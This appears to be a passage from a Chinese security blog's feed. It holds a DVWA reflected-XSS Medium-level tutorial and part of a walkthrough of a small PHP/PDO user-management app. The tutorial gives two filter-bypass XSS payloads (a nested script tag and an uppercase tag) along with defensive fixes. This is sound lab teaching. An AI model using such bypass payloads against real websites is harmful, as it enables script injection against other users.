      <link href="/2018/05/25/%E5%9F%BA%E4%BA%8EDVWA%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXss%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0Medium%E7%AD%89%E7%BA%A7%E8%AE%B2%E8%A7%A3/"/>
      <url>/2018/05/25/%E5%9F%BA%E4%BA%8EDVWA%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXss%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0Medium%E7%AD%89%E7%BA%A7%E8%AE%B2%E8%A7%A3/</url>
      <content type="html"><![CDATA[<div class="note primary"><p>这是继上节课[基于DVWA的Xss测试平台Low等级讲解]的中等级</p></div><a id="more"></a><p><strong>首先，我们把等级设置为<code>Medium</code> 上节课讲了如何设置这里就不再讲了</strong></p><h3 id="查看Medium源代码"><a href="#查看Medium源代码" class="headerlink" title="查看Medium源代码:"></a>查看<code>Medium</code>源代码:</h3><p><img src="http://static.zybuluo.com/1kbfree/lcvg5jbwdqdbmyxlai363f9l/image_1ceaj53i93ri2t12be93ndtqp.png" alt="image_1ceaj53i93ri2t12be93ndtqp.png-140.1kB"></p><p><strong>点开后是这样的：</strong><br><img src="http://static.zybuluo.com/1kbfree/bb6yzgt81wtl2guv6u9yus7l/image_1ceaj6a2b9ti1o1ee8s1dh31p5v16.png" alt="image_1ceaj6a2b9ti1o1ee8s1dh31p5v16.png-148.6kB"></p><p>代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><em>这里的代码部分也很好理解，比上一章仅仅多了一个过滤，下面来详细讲解一下。</em></p><blockquote><p><code>if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL )</code>这段代码的意思是，如果$_GET中有name这个key并且<code>$_GET[ &#39;name&#39; ]</code>的值不为空的话就执行<code>{}</code>里面的代码。<br><code>$name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );</code>这句话的意思是把<code>$_GET[&#39; name &#39;]</code>中的<code>&lt;script&gt;</code>过滤为空( <em>并不安全</em> ),最后一段代码就是输出Hello+name的值在页面上</p></blockquote><h3 id="看懂代码后，如何利用呢"><a href="#看懂代码后，如何利用呢" class="headerlink" title="看懂代码后，如何利用呢?"></a>看懂代码后，如何利用呢?</h3><p><em>我们在上面看代码的时候明白了，在这个<code>Medium</code>等级中，只做了把<code>&lt;script&gt;</code>字符给过滤了，那么我下面就来演示一下如何绕过</em></p><h4 id="先来输入-lt-script-gt-后看看是否为空"><a href="#先来输入-lt-script-gt-后看看是否为空" class="headerlink" title="先来输入&lt;script&gt;后看看是否为空:"></a>先来输入<code>&lt;script&gt;</code>后看看是否为空:</h4><p><img src="http://static.zybuluo.com/1kbfree/q8ojr60jtlbgd9j0au2ouazt/image_1ceajjf5k1tj96go2gr1g67125m1j.png" alt="image_1ceajjf5k1tj96go2gr1g67125m1j.png-86.9kB"><br><em>可以看到这里的输出是为空的，下面来讲绕过</em></p><h4 id="绕过方法1："><a href="#绕过方法1：" class="headerlink" title="绕过方法1："></a>绕过方法1：</h4><p>在输入框中输入<code>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;iamfree&#39;)&lt;/script&gt;</code>，来看看结果先:<br><img src="http://static.zybuluo.com/1kbfree/84iq3szjet2wj8yx7ajecdzh/image_1ceajnhjabo21p1gvvr98fad820.png" alt="image_1ceajnhjabo21p1gvvr98fad820.png-187.2kB"></p><p>解释:<br><img src="http://static.zybuluo.com/1kbfree/kx039acf60sxdjfnf2vo5t8k/image_1ceajudl1146t1oc7g2a6eof402d.png" alt="image_1ceajudl1146t1oc7g2a6eof402d.png-226.2kB"></p><h4 id="绕过方法2"><a href="#绕过方法2" class="headerlink" title="绕过方法2:"></a>绕过方法2:</h4><p>用大写的绕过,输入<code>&lt;SCRIPT&gt;alert(&#39;iamfree&#39;)&lt;/SCRIPT&gt;</code><br><img src="http://static.zybuluo.com/1kbfree/m11mwkcv0os5q4zlmrdu0w06/image_1ceb2ofbv8vt1onl1ksphkse9v9.png" alt="image_1ceb2ofbv8vt1onl1ksphkse9v9.png-99.1kB"></p><h3 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h3><h4 id="防御方法1"><a href="#防御方法1" class="headerlink" title="防御方法1:"></a>防御方法1:</h4><p>其实防御的方法也和上篇一样，但还有一个也很棒的方法哟。<br><img src="http://static.zybuluo.com/1kbfree/gqffm3fwqdt4k6vs7pmzer9u/image_1cealoccsqkbaqe36k11o114j23n.png" alt="image_1cealoccsqkbaqe36k11o114j23n.png-92.4kB"></p><p>代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="comment">// $name = str_replace( '&lt;script&gt;', 'xss', $_GET[ 'name' ] );</span></span><br><span class="line">    <span class="keyword">foreach</span> ( $_GET <span class="keyword">as</span> $key =&gt; $value ) &#123; <span class="comment">//把$_GET数组里的值分成$key和$value</span></span><br><span class="line">        $name = $_GET[ $key ] = htmlspecialchars( $value ); <span class="comment">//把$_GET数组中$key对应的$value值html实例化，并且赋值给$name变量</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    $html .= <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/1kbfree/a5wvesn1t9741djg96556kmi/image_1ceall6lr1hh9v331eodlhs1a9t2q.png" alt="image_1ceall6lr1hh9v331eodlhs1a9t2q.png-75.9kB"></p><h4 id="防御方法2："><a href="#防御方法2：" class="headerlink" title="防御方法2："></a>防御方法2：</h4><p><img src="http://static.zybuluo.com/1kbfree/l0deuo57o271iokpaxa2nq9x/image_1ceam2i9s1v1m18m8be116tn1vpn4n.png" alt="image_1ceam2i9s1v1m18m8be116tn1vpn4n.png-93.1kB"></p><p>只需要加上一条<code>preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] )</code>，这也是<code>high</code>等级的防御方法</p><p><img src="http://static.zybuluo.com/1kbfree/z03p7xg6vp5riplabe5q7ti5/image_1ceam65gk1rn8140916so14nf1rfd54.png" alt="image_1ceam65gk1rn8140916so14nf1rfd54.png-64.4kB"></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> Dvwa </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> Xss </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>简单的用户管理分析</title>
      <link href="/2018/05/24/%E7%AE%80%E5%8D%95%E7%9A%84%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E5%88%86%E6%9E%90/"/>
      <url>/2018/05/24/%E7%AE%80%E5%8D%95%E7%9A%84%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>这是笔者从GITHUB上找的简单PHP程序( 一个可 <em>增删查</em> 的用户数据管理 )</p><a id="more"></a><p><img src="http://static.zybuluo.com/1kbfree/4z5de16ziysrio7dqad9u1ow/image_1cc2vfnu31qpg1a1j1fob13be3ejm.png" alt="image_1cc2vfnu31qpg1a1j1fob13be3ejm.png-72.6kB"></p><hr><h2 id="数据库连接代码"><a href="#数据库连接代码" class="headerlink" title="数据库连接代码:"></a>数据库连接代码:</h2><p><strong>先介绍一下数据库的表结构：</strong></p><p><img src="http://static.zybuluo.com/1kbfree/jgp8ljt3m0adp7i8ty1kkdr2/image_1cc3136er1ru31m9si1chlcue21t.png" alt="image_1cc3136er1ru31m9si1chlcue21t.png-24.4kB"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=data'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>); <span class="comment">//PDO(PHP访问数据库定义了一个轻量级的、一致性的接口，它提供了一个数据访问抽象层，这样，无论使用什么数据库，都可以通过一致的函数执行查询和获取数据，比如mysql有limit，MSSQL没有limit，pdo会自动转换)</span></span><br><span class="line">    $pdo-&gt;exec(<span class="string">'set names utf8'</span>); <span class="comment">//设置编码</span></span><br><span class="line">    $pdo-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE,PDO::FETCH_ASSOC); <span class="comment">//设置默认结果集模式为关联数组</span></span><br><span class="line">    $pdo-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION); <span class="comment">//修改报错模式</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="其中的PDO是"><a href="#其中的PDO是" class="headerlink" title="其中的PDO是:"></a>其中的PDO是:</h3><p><em>PDO(PHP访问数据库定义了一个轻量级的、一致性的接口，它提供了一个数据访问抽象层，这样，无论使用什么数据库，都可以通过一致的函数执行查询和获取数据，比如mysql有limit，MSSQL没有limit，pdo会自动转换)</em></p><p><strong>PDO好处：</strong></p><ol><li>更换数据库时取得极大便利(从A数据库换成其他数据库可以不需要修改查询的代码，因为PDO帮我实现了)</li><li>更换数据库时取得极大便利</li></ol><h2 id="首页代码："><a href="#首页代码：" class="headerlink" title="首页代码："></a>首页代码：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span> <span class="string">'config.inc.php'</span>; <span class="comment">//包含连接数据库的代码</span></span><br><span class="line"></span><br><span class="line">    $len = <span class="number">10</span>; <span class="comment">//每页展现10条数据</span></span><br><span class="line">    $page = !<span class="keyword">empty</span>($_GET[<span class="string">"page"</span>]) ? $_GET[<span class="string">"page"</span>] : <span class="number">1</span>;<span class="comment">//三元表达式，表示如果$_GET['page']为空时，默认值为1</span></span><br><span class="line"></span><br><span class="line">    $sqlTotal = <span class="string">"select count(Id) from t1"</span>; <span class="comment">// SQL语句。意思是查询t1表中的Id字段个数</span></span><br><span class="line">    $smtTotal = $pdo-&gt;prepare($sqlTotal); <span class="comment">//准备要执行的SQL语句并返回一个 PDOStatement 对象(PHP 5 &gt;= 5.1.0, PECL pdo &gt;= 0.1.0)</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;strong&gt;\$sqlTotal:&lt;/strong&gt;"</span>;</span><br><span class="line">    print_r($smtTotal);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;strong&gt;execute():&lt;/strong&gt;"</span>;</span><br><span class="line">    print_r($smtTotal-&gt;execute());</span><br><span class="line">    $tot = $smtTotal-&gt;fetchColumn();    <span class="comment">//总记录数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;strong&gt;\$tot:&lt;/strong&gt;"</span>;</span><br><span class="line">    print_r($tot);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $pages = ceil($tot/$len);   <span class="comment">//总页数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;strong&gt;\$pages:&lt;/strong&gt;"</span>;</span><br><span class="line">    print_r($pages);</span><br><span class="line">    ... ...(省略，先讲解一下这段代码的用法)</span><br></pre></td></tr></table></figure><p><img src="http://static.zybuluo.com/1kbfree/bepqcvepabcym10rq7qnksgz/image_1cc30pp7sd2s1qr7198mul41vig1g.png" alt="image_1cc30pp7sd2s1qr7198mul41vig1g.png-34.8kB"></p><blockquote><p>可以看看我写的PDO的<a href="https://www.zybuluo.com/1kbfree/note/1128672" target="_blank" rel="noopener">文章</a>(别夸我，谁让我是爱学习的好孩子)</p></blockquote><h3 id="首页的代码我统统写了注释："><a href="#首页的代码我统统写了注释：" class="headerlink" title="首页的代码我统统写了注释："></a>首页的代码我统统写了注释：</h3><p><img src="http://static.zybuluo.com/1kbfree/sc0wogf37jngd8cpysvke01r/image_1cc3s3mnp9ma7luult1egp1rk19.png" alt="image_1cc3s3mnp9ma7luult1egp1rk19.png-178.8kB"></p><h2 id="更改用户数据代码："><a href="#更改用户数据代码：" class="headerlink" title="更改用户数据代码："></a>更改用户数据代码：</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line">/* </span><br><span class="line">    思路:先获取对应的数据，然后返回到输入框，如果我们选择提交，表单就会发送的数据就会更改到数据库里，实现更改内容</span><br><span class="line"><span class="php">*/</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'config.inc.php'</span>;</span></span><br><span class="line"><span class="php">$Id = $_GET[<span class="string">"Id"</span>]; <span class="comment">//获取GET请求过来的Id值</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$sql = <span class="string">"select * from t1 where Id=?"</span>; <span class="comment">//SQL语句的查询</span></span></span><br><span class="line"><span class="php">$smt = $pdo-&gt;prepare($sql); <span class="comment">//给SQL语句做标记</span></span></span><br><span class="line"><span class="php">$smt-&gt;bindValue(<span class="number">1</span>,$Id); <span class="comment">//想成是给上面的?改成$Id变量的值</span></span></span><br><span class="line"><span class="php">$smt-&gt;execute(); <span class="comment">//执行SQL语句</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$row = $smt-&gt;fetch(); <span class="comment">//接收SQL语句查询到的结果</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>update<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"bower_components/jquery/dist/jquery.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"bower_components/bootstrap/dist/js/bootstrap.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"bower_components/bootstrap/dist/css/bootstrap.min.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"page-header"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php"</span> <span class="attr">class</span>=<span class="string">"btn btn-warning"</span>&gt;</span>查看用户<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>修改用户<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"act.php?act=update&amp;Id=&lt;?php echo $Id;?&gt;"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span> <span class="comment">&lt;!-- act页面实现的修改功能，这里只需要传入要修改的Id值就可以更改此Id中对应的数据 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span>&gt;</span>新用户名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            &lt;input type="text" class="form-control" name="Name" value=&lt;?php echo "&#123;$row['Name']&#125;";//把查询到的数据的Name返回到输入框中，这样子我们就可以实现修改功能 ?&gt;</span><br><span class="line">            &gt;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span>&gt;</span>新密码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"Pwd"</span> <span class="attr">value</span>=</span></span><br><span class="line">            &lt;?php echo "&#123;$row['Pwd']&#125;"; //同上?&gt;</span><br><span class="line">            &gt;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"reset"</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="插入数据代码："><a href="#插入数据代码：" class="headerlink" title="插入数据代码："></a>插入数据代码：</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>add<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"bower_components/jquery/dist/jquery.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"bower_components/bootstrap/dist/js/bootstrap.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"bower_components/bootstrap/dist/css/bootstrap.min.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"page-header"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php"</span> <span class="attr">class</span>=<span class="string">"btn btn-warning"</span>&gt;</span>查看用户<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>添加用户<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"act.php?act=insert"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span> <span class="comment">&lt;!-- act.php页面实现了插入功能，所以这里我们只需要把内容提交到act.php就可以完成插入内容 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span>&gt;</span>用户名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"Name"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span>&gt;</span>密码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"Pwd"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"reset"</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="删除功能代码"><a href="#删除功能代码" class="headerlink" title="删除功能代码:"></a>删除功能代码:</h2><p><strong>删除页面代码也在首页(index.php)里实现的</strong><br><img src="http://static.zybuluo.com/1kbfree/snrsn6lp951qha73mz3fbdpa/image_1cc57auk9gkn62o16121cad1bau9.png" alt="image_1cc57auk9gkn62o16121cad1bau9.png-104.5kB"><br><em>一般我们删除操作是需要十分谨慎的，因为数据一旦删除是无法恢复的，那么如果用户不小心点到了按钮，我们就应该提醒他是否要删除。</em></p><p><img src="http://static.zybuluo.com/1kbfree/h9iti01jywhmby5a3x4n8h3o/image_1cc57donr1leu1i341t1r1479fafm.png" alt="image_1cc57donr1leu1i341t1r1479fafm.png-36kB"><br><em>可以看到这里有一个class是delete，然后看到下面有一段提醒是否执行删除的JS代码：</em><br><img src="http://static.zybuluo.com/1kbfree/79lf8bu5wdylyn1rmkhrzgu9/image_1cc57nvhn1dml1u0910ko1sccv4213.png" 